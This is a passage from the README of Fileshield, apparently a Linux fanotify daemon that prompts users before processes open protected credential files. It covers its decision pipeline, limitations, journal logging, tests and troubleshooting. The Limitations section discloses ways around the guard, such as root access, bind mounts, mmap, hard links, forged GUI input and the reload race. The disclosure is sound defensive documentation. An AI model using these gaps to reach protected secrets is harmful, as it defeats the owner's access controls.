A rebuilt or updated binary stops matching its old _Always_ entry (the stored binary SHA-512 changed), so the next prompt records a new entry and leaves the old one behind as a stale duplicate. `prune` groups entries that share the same **binary path, target file, raw command line and call chain** (digests are deliberately not part of the key), keeps the newest entry of each group and removes the rest — exact duplicates collapse to one. It never hashes a binary and never opens a path. The call chain is compared level by level by comm name, so the same helper run from a different terminal (for example `... > zsh` versus `... > warp`) is a separate rule and is never merged. Every matched group is listed before the confirmation prompt with its shared key and then each member — ID, `keep`/`remove`, creation time — so the grouping can be audited; when nothing matches, it prints `there are no results to prune` and exits without prompting. `-n`/`--dry-run` lists and exits without touching anything, and `-y` skips the prompt. The same grouping runs inside the daemon when it applies a live prune, so memory and disk stay consistent.

### Confirmation

`remove`, `clear`, `prune`, `session remove` and `session clear` print what they will do and ask `[y/N]`; only `y`/`Y` (or `-y`/`--yes`) proceeds. If stdin is not a terminal and `-y` was not given, the CLI refuses with a nonzero exit instead of reading EOF or a pipe as consent — a script that wants to mutate must pass `-y`.

---

## How It Works

1. The daemon calls `fanotify_init(FAN_CLOEXEC | FAN_NONBLOCK | FAN_CLASS_CONTENT | FAN_UNLIMITED_QUEUE, O_RDONLY | O_LARGEFILE)`. `FAN_UNLIMITED_QUEUE` is required for fail-closed semantics: with a bounded queue the kernel drops permission events on saturation and lets the access proceed. `FAN_NONBLOCK` keeps the group fd non-blocking so the event loop can `poll()` on `{group fd, signal-wake pipe}` — a signal arriving just before a blocking read would otherwise suspend shutdown/reload on an idle filesystem, and a supervisor SIGKILL in that window would let the kernel auto-allow every outstanding permission event.
2. It registers `FAN_OPEN_PERM | FAN_EVENT_ON_CHILD` marks on each protected path via `fanotify_mark()` (the child flag lets directory marks report accesses to their entries).
3. When a process opens a watched file, the kernel delivers a `fanotify_event_metadata` event and **blocks the calling process**.
4. The daemon resolves the binary path via `/proc/<pid>/exe` and evaluates the decision pipeline (config denylist, session/permanent denials, file cache, session/permanent grants, `[unsafe_allowlist]`, then the hash-pinned `[allowlist]`). Config-rule hits additionally raise the bounded `notify-send` tripwires described under [Notifications](#notifications).
5. On a miss, it spawns a `kdialog --menu` popup on the requesting user's desktop session and reads the chosen row's tag from the dialog's stdout; a selection (zero exit + a known tag) is the only way to grant, so cancel, timeout, window close and any runtime failure deny the access (fail closed). The session is detected per prompt and applied only in the dialog child (the daemon's own environment is never modified), so a prompt for one user's process cannot appear on another user's desktop.
6. It writes a `struct fanotify_response` with `FAN_ALLOW` or `FAN_DENY` back to the fanotify fd.
7. The kernel unblocks the original syscall with the appropriate result.

---

## Limitations

- **Root processes**: A process running as root can bypass fanotify. Fileshield protects against unprivileged or compromised user-space processes.
- **GUI dependency**: Requires a desktop session for popups; on non-KDE desktops the popup matches the system theme only when a Qt platform theme integration is installed.
- **Kernel version**: `fanotify` permission events on directories require kernel 5.0+.
- **Networked filesystems**: `fanotify` marks do not propagate to NFS/CIFS mounts.
- **Bind mounts and `mmap`**: `fanotify` only reports events on the mount the mark was placed on, and does not report `mmap(2)` accesses. Bind-mount aliases of protected paths, or a process that already holds an open descriptor, are outside the threat model.
- **Hard links and symlinks**: Protected paths are canonicalized at load time, so a symlinked home or config directory is still matched, and files present when the daemon starts are tracked by inode. Opening one of those inodes through a path outside every protected prefix (a hard link) always prompts — allow rules are skipped for that open (see [Decision Scopes](#decision-scopes)). Files created after startup, files deeper than 8 directory levels under a protected path, and inodes past the 32,768-entry table cap are not inode-tracked; tracking brand-new inodes via `FAN_CREATE` requires a `FAN_REPORT_FID` group and is a planned follow-up.
- **TOCTOU on binary identity**: The daemon resolves the calling process's binary via `/proc/<pid>/exe` while the process is kernel-suspended. The process cannot `execve()` at that moment, but its binary on disk could theoretically be replaced between the `readlink()` and the allowlist/cache check. This is an inherent limitation of all fanotify-based permission systems and is considered low-risk in practice.
- **Dialog rate limiting**: To bound prompt-flooding (e.g. a process that re-execs itself repeatedly), a binary path is denied without prompting after 20 prompts within 60 seconds, for a 30-second cooldown. Prompts are also capped at 40 across all binaries within 60 seconds, so a flood that rotates through many distinct executable paths (each landing in a fresh per-binary entry) cannot evade the per-binary bound.
- **Reload is not atomic**: a config reload removes every kernel mark and re-installs the new set, so protected paths are unmarked for the duration of the walk (milliseconds). A process racing an administrator-triggered reload can open a protected file without a prompt; the resulting mark set is always the configured one or the daemon shuts down (reject/rollback), but the transition itself is not mediated. A mark whose kernel removal fails stays tracked and is retried on the next reload instead of being forgotten.
- **GUI consent is not a defense against a same-uid process**: prompts appear on the desktop session detected for the requesting user. A process already running as that user can in principle forge input to the GUI (X11 synthetic events, or a planted `wayland-*` socket under `/run/user/<uid>`), just as it can read anything the user can read. The prompt protects against other users and unattended access, not against a fully compromised session.
- **Command-line matching**: permanent _Always_ entries pin the exact command line, so tools whose arguments change every run (timestamps, random tokens, one-off URLs) will prompt on each invocation. Use _Allow Session_ or _Allow Once_ for those, or remove the persisted entry with `fileshield-cli remove` (see [Persistence](#persistence)).
- **Allowlist pins are keyed by rule pattern**: an exact rule pins one binary path, but a glob rule pins the pattern itself, so two different binaries matching the same rule **share one pin** and switching between them prompts for a hash update. Use `[unsafe_allowlist]` for tools whose binary churns (AppImages, tmp mounts). A pin file containing two rows with the same pattern is treated as damaged and falls back to prompting. Pins are also evicted once the table exceeds 256 entries (oldest `updated_at` first).
- **Allowlisted binaries must be hashable**: a binary under a protected path is deliberately not hashed, and a fork/exec failure or timeout leaves the digest unavailable — in both cases an `[allowlist]` match falls back to the normal prompt instead of granting silently, and the prompt states the reason and points at `[unsafe_allowlist]` for a permanent grant. A damaged or unreadable `allowlist-hashes.json` fails closed the same way until it is repaired or removed. A failed hash is retried at most once per minute per binary (keyed by mount identity, or by process identity when the executable cannot be stat'ed), and the `sha512` log line names the failing path and reason; ancestor hashes are computed only when a runtime _Always_ entry passes the path/digest checks and the chain comparison is actually needed — or when a prompt is shown.
- **Denylist rules are never hash-checked**: pinning exists to detect a replaced allowlisted binary; a deny is enforced regardless of which binary matches.
- **Pin removal goes through the daemon**: `fileshield-cli remove pin` and `fileshield-cli clear pins` delete pins through the control socket; the change dialog remains the only way to add or update one. `allowlist-hashes.json` stays root-readable for inspection, and a repaired or replaced file takes effect on the next reload.
- **Control socket**: the CLI's mutations travel over `/run/fileshield/control.sock` — root-owned, mode 0600, peer uid checked, and bounded non-blocking reads per connection (a slow client is never waited for). The `/run/fileshield` directory is created 0700 by the systemd unit (`RuntimeDirectory=fileshield`) and removed when the service stops; a foreground run without systemd creates it on demand the same way. `list`/`describe` read the state files directly; mutations fall back to direct file edits only when no listener answers (`ENOENT`/`ECONNREFUSED`), never on `EACCES` or another error. Session rules exist only in daemon memory, so every session command requires the running daemon.
- **Stored rule IDs**: persisted rules and live session entries carry a 16-hex ID; the daemon assigns IDs to legacy entries when it loads them and rewrites the state file immediately (grants are preserved, never dropped). Lookups accept an unambiguous prefix of at least 8 characters; pin IDs are derived from the pattern and not stored.
- **Prune keeps the newest entry**: a duplicate group shares the binary path, target, raw command line and call chain, and the newest list member is kept. Prune does not hash binaries, so it does not verify which entry matches what is currently on disk; `created_at` is display/tie-break information only.
- **No CLI for adding rules or pins**: the kdialog remains the only grant channel. `fileshield-cli` can list, describe, remove, clear and prune existing entries, manage session rules and request a reload, but it cannot create a rule or a pin.
- **Config limits are hard refusals**: a config with more than **1024** protected entries — remember each `~/…` line expands once per real user — or more than **128** rules in any of `[allowlist]`, `[unsafe_allowlist]` or `[denylist]` is rejected **as a whole**. Startup exits; a `SIGHUP` reload logs an error and keeps the previous config. Nothing is ever silently dropped. Likewise, if a mark cannot be tracked (mark-table cap) the daemon removes the just-installed kernel mark and fails the load rather than running with a mark set it could not clean up. Inode-set and mount-table capacity overflows remain non-fatal (they can occur from ordinary large directories) but are logged at `ERR` because hard-link detection is degraded.
- **The shipped default list assumes a small number of real users**: the shipped `[protected_paths]` block has 91 `~/…` entries, each expanded once per real user (UID 1000–65533), so the 1024-entry cap is exceeded and the config is refused once a **12th** real user exists. Trim the list or replace the per-user entries on shared hosts.
- **Notifications are best-effort and attacker-triggerable**: they need a detectable desktop session and `notify-send`; otherwise they are skipped (access decisions are unaffected). Anyone who can trigger a rule can also trigger a notification, so delivery is deduplicated (`notify_dedup_ttl`), capped (`notify_max` per 60 s), and unsafe hits notify once per process; the notification is only a heads-up — the journal is the record. User dialog decisions (Allow/Deny Once/Session/Always) never notify, because the user just made them.

---

## Logs

Fileshield writes all events to the system journal via `syslog(3)` under the `LOG_DAEMON` facility and the identifier `fileshield`.

### Log verbosity

By default Fileshield logs **one line per access**: a rule hit logs which
list allowed/denied it (first access per TTL window — repeats inside the
window are silent), and a dialog access logs the prompt plus a
human-readable choice:

```text
dynamic allowlist hit: /usr/bin/md5sum (pid 108385) -> ~/.kube/config
[dialog] asking user: pid=108783 binary=/usr/bin/cat target=~/.kube/config comm=cat
[dialog] user chose Allow Once for /usr/bin/cat (pid 108783) -> ~/.kube/config
```

The per-event plumbing (`[event]`, `[dedup]`, `[pump]`, display-env
forwarding) is `LOG_DEBUG` and is suppressed by default. Enable it for
troubleshooting either with `debug = yes` in `[settings]` or with the
daemon's `-d/--debug` flag (also available via `--foreground` runs); both
survive a `SIGHUP` config reload for the settings key.

The daemon logs at the following levels:

| Level     | Events                                                                                                                                                                                                                                                                                                                                                |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `INFO`    | Start/stop, config load, fanotify marks added/removed, reload, one line per access (rule hits, prompts, user choices), config allowlist first-use hash pins                                                                                                                                                                                           |
| `DEBUG`   | Per-event plumbing: raw event receipt, target resolution, dedup-cache reuse, pump decisions, dialog child lifecycle. Suppressed unless `debug = yes` in `[settings]` or `--debug`                                                                                                                                                                     |
| `WARNING` | `[unsafe_allowlist]` grants, first hit per process (rule, binary, PID, target), failed marks (path not found), dialog timeout/failure, session detection unavailable, binary digest unavailable when a prompt is shown (the reason follows on the access line), allowlist hash-change prompts (full old/new digests) and approvals, hard-link prompts |
| `ERR`     | `fanotify_init` failure, config parse error or limit overflow (config refused), untrackable mark (installation fails, kernel mark removed), fork/exec failure, `sha512` helper timeout/failure (names the path and reason), damaged `allowlist-hashes.json`                                                                                           |

### Follow live events

```bash
# systemd journal (recommended)
journalctl -u fileshield -f

# or filter by syslog identifier across all units
journalctl -t fileshield -f
```

### Query past events

```bash
# Everything since last boot
journalctl -u fileshield -b

# Last 100 lines
journalctl -u fileshield -n 100

# Only errors and above
journalctl -u fileshield -p err

# Between two timestamps
journalctl -u fileshield --since "2026-05-26 09:00" --until "2026-05-26 10:00"
```

---

## Running in Foreground (Debug Mode)

To see all log output directly in the terminal without systemd, stop the service and run the daemon in the foreground:

```bash
sudo systemctl stop fileshield
sudo ./build/fileshield --foreground --config fileshield.conf
```

When stderr is attached to a terminal, `syslog` messages are also printed there (under systemd they appear once in the journal). Combine with `strace` for deep inspection:

```bash
sudo strace -e trace=fanotify_init,fanotify_mark,read,write \
    ./build/fileshield --foreground --config fileshield.conf
```

### AddressSanitizer / UBSan build

```bash
make debug
sudo ./build/fileshield --foreground --config fileshield.conf
```

This builds with `-O0 -g -fsanitize=address,undefined` and prints any memory errors or undefined behaviour to stderr immediately.

### Preflight with `--dry-run`

`--dry-run` parses the config, prints every mark the daemon would install (including the init-namespace path used for mount marks), runs the startup scope guard, and exits without touching the kernel — useful on a new machine before enabling the service:

```bash
sudo ./build/fileshield --dry-run --config fileshield.conf
```

---

## Running Tests

Unit tests cover the cache, config parser, session decisions, JSON state files, allowlist hash pins, SHA-512 digests, the protected-inode set, the reload decision path, fanotify event handling, rule IDs, prune grouping, CLI rendering, the control protocol, and utility functions. They require no root and no kernel fanotify support (the kernel saturation test self-skips without `CAP_SYS_ADMIN`).

```bash
# Build and run all tests
make test

# Build tests without running
make build/test_cache build/test_config build/test_reload build/test_session build/test_persist build/test_pin build/test_sha512 build/test_inode build/test_utils build/test_fanotify build/test_ruleid build/test_prune build/test_cli_ui build/test_control

# Run a single test binary directly
./build/test_cache
./build/test_config
./build/test_reload
./build/test_session
./build/test_persist
./build/test_pin
./build/test_sha512
./build/test_inode
./build/test_utils
./build/test_fanotify
./build/test_ruleid
./build/test_prune
./build/test_cli_ui
./build/test_control
```

A passing run prints `PASS` for each suite; failures print the failing assertion and exit non-zero.

### Static analysis

```bash
make lint
```

Runs `cppcheck` over all sources in `src/` and `tests/`. Requires `cppcheck` to be installed (`apt install cppcheck` / `dnf install cppcheck`).

### Benchmarks

```bash
make bench
```

Builds and runs `tests/bench_hotpath.c`, the microbenchmarks for the per-event hot path (allow cache, path matching, SHA-512 fingerprints, runtime-list matching, protected-inode lookups). Hot-path changes are kept only when the harness shows a win; before/after numbers are recorded in the commit message and in comments at the changed sites.

---

## Troubleshooting

- **No popups appear?** The daemon auto-detects the Wayland socket and D-Bus address under `/run/user/<uid>/`. Verify the desktop session is active and `kdialog` is installed (`apt install kdialog` / `dnf install kdialog`). If kdialog is missing or fails, access is denied (fail closed).
- **Dialog does not match your theme?** The daemon runs as root with a bare environment, so Fileshield forwards a whitelist of your session's appearance variables (`XDG_CURRENT_DESKTOP`, `KDE_FULL_SESSION`/`KDE_SESSION_VERSION`, `QT_QPA_PLATFORMTHEME`, `QT_STYLE_OVERRIDE`, scale factors, locale, cursor) into the dialog child after it drops to your user. On Plasma/KDE this makes kdialog use your color scheme and fonts automatically. On other desktops the dialog follows the system theme only if a Qt platform theme integration is installed (e.g. `qgnomeplatform`/adwaita-qt for GNOME, `qt6ct`); without one Qt falls back to its default light theme.
- **Dialog behavior on failure**: the access prompt is a `kdialog --menu`; the decision is the selected row's tag read from the dialog's **stdout** together with a zero exit code. Cancel, window close, the 30 s timeout, exec failures and every kdialog runtime error produce no selection and **deny the access (fail closed)** — a grant (even *Allow Once*) requires an explicit row pick. This replaces the old two-stage button flow, whose `Allow Always` sat on the No button (kdialog exit code 1), an exit code kdialog also returns for some runtime errors. The hash-change prompt still uses a Yes/No dialog: **Yes** updates the pin, and every other outcome (No, Cancel, timeout, failure) denies this attempt and keeps the old hash.
- **Access blocked for a trusted process?** Add it to `[allowlist]` in `/etc/fileshield.conf` and run `sudo systemctl reload fileshield`. If the binary is already allowlisted, the prompt may be asking about a hash change — approve it only if you expected the binary to be rebuilt or updated. If the binary cannot be pinned at all (an AppImage or other tmp-mount tool), `[unsafe_allowlist]` is the escape hatch — with the caution described in [Handle with caution](#handle-with-caution). Check `journalctl -u fileshield -n 20` to confirm the reload succeeded.
- **Daemon fails to start?** Confirm the service runs as root — `fanotify_init` requires `CAP_SYS_ADMIN`. Check `journalctl -u fileshield -p err` for the exact error.
- **A path is watched but events are not firing?** Verify the mark was added successfully (`journalctl -t fileshield | grep "mark added"`). Paths on NFS/CIFS mounts or inside containers are not supported by fanotify.
- **All accesses denied with no popup on a headless machine?** Fileshield requires a live desktop session to display dialogs. On headless hosts the daemon will deny all unknown accesses (fail-closed). Run in foreground mode and inspect the stderr output to confirm.

---

## License

MIT License. See [LICENSE](LICENSE) for details.
